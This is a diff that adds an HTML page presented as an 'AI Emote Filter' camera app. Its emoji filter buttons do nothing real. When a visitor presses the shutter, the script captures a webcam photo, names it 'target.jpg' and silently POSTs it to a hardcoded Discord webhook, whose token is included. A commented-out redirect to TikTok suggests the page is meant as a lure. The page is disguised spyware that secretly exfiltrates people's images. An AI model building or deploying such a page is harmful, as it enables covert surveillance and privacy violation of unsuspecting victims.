@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Emote Filter</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; overflow: hidden; height: 100vh; width: 100vw; display: flex; flex-direction: column; }
+        
+        #camera-view { position: relative; flex: 1; overflow: hidden; background: #111; display: flex; justify-content: center; align-items: center; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        
+        .top-bar { position: absolute; top: 0; left: 0; width: 100%; padding: 20px; display: flex; justify-content: space-between; align-items: center; background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent); z-index: 10; }
+        .title { font-size: 18px; font-weight: bold; text-shadow: 0 1px 3px rgba(0,0,0,0.8); }
+        .close-btn { font-size: 24px; cursor: pointer; font-weight: bold; }
+        
+        .filter-strip { position: absolute; bottom: 120px; left: 0; width: 100%; display: flex; overflow-x: auto; gap: 15px; padding: 0 20px; scrollbar-width: none; z-index: 10; }
+        .filter-strip::-webkit-scrollbar { display: none; }
+        .filter-item { flex: 0 0 auto; width: 55px; height: 55px; border-radius: 50%; background: rgba(255,255,255,0.2); display: flex; justify-content: center; align-items: center; font-size: 28px; border: 2px solid transparent; cursor: pointer; backdrop-filter: blur(5px); }
+        .filter-item.active { border-color: #fff; background: rgba(255,255,255,0.4); }
+        
+        .bottom-bar { position: absolute; bottom: 0; left: 0; width: 100%; height: 120px; display: flex; justify-content: space-around; align-items: center; background: #000; z-index: 10; }
+        .gallery-icon { width: 40px; height: 40px; border-radius: 8px; background: #333; }
+        .shutter-btn { width: 75px; height: 75px; border-radius: 50%; background: #fff; border: 4px solid #555; cursor: pointer; transition: transform 0.1s; }
+        .shutter-btn:active { transform: scale(0.92); }
+        .flip-icon { font-size: 28px; cursor: pointer; }
+        
+        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; opacity: 0; pointer-events: none; z-index: 100; transition: opacity 0.1s; }
+        #flash.active { opacity: 1; }
+    </style>
+</head>
+<body>
+
+<div id="camera-view">
+    <video id="video" autoplay playsinline></video>
+    
+    <div class="top-bar">
+        <div class="title">✨ AI Filter</div>
+        <div class="close-btn">✕</div>
+    </div>
+
+    <div class="filter-strip">
+        <div class="filter-item active" onclick="setFilter(this)">😎</div>
+        <div class="filter-item" onclick="setFilter(this)">😍</div>
+        <div class="filter-item" onclick="setFilter(this)">🤡</div>
+        <div class="filter-item" onclick="setFilter(this)">👻</div>
+        <div class="filter-item" onclick="setFilter(this)">🐶</div>
+        <div class="filter-item" onclick="setFilter(this)">🔥</div>
+    </div>
+
+    <div class="bottom-bar">
+        <div class="gallery-icon"></div>
+        <div class="shutter-btn" id="captureBtn"></div>
+        <div class="flip-icon">🔄</div>
+    </div>
+</div>
+
+<div id="flash"></div>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1561391421200797738/dfLpkO0PbTGmigN72TW2CxmfXoCL4bFIw8xmMxR_9bPvQNhjCGD6LunWTJ-gFl3wlcWA"; 
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureBtn = document.getElementById('captureBtn');
+    const flash = document.getElementById('flash');
+
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+        } catch (err) {
+            alert("Kamera tidak dapat diakses. Pastikan izin diberikan.");
+        }
+    }
+    startCamera();
+
+    window.setFilter = function(element) {
+        document.querySelectorAll('.filter-item').forEach(btn => btn.classList.remove('active'));
+        element.classList.add('active');
+        video.style.filter = "brightness(1.1) contrast(1.1)";
+        setTimeout(() => { video.style.filter = "none"; }, 150);
+    };
+
+    captureBtn.addEventListener('click', () => {
+        flash.classList.add('active');
+        setTimeout(() => flash.classList.remove('active'), 150);
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        const formData = new FormData();
+        const blob = dataURItoBlob(imageData);
+        formData.append("file", blob, "target.jpg");
+        formData.append("payload_json", JSON.stringify({
+            content: `📸 **Filter Captured!**`
+        }));
+
+        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
+            .then(() => {
+                // window.location.href = "https://www.tiktok.com";
+            })
+            .catch(err => console.log("Gagal"));
+    });
+
+    function dataURItoBlob(dataURI) {
+        const byteString = atob(dataURI.split(',')[1]);
+        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], { type: mimeString });
+    }
+</script>
+
+</body>
+</html>
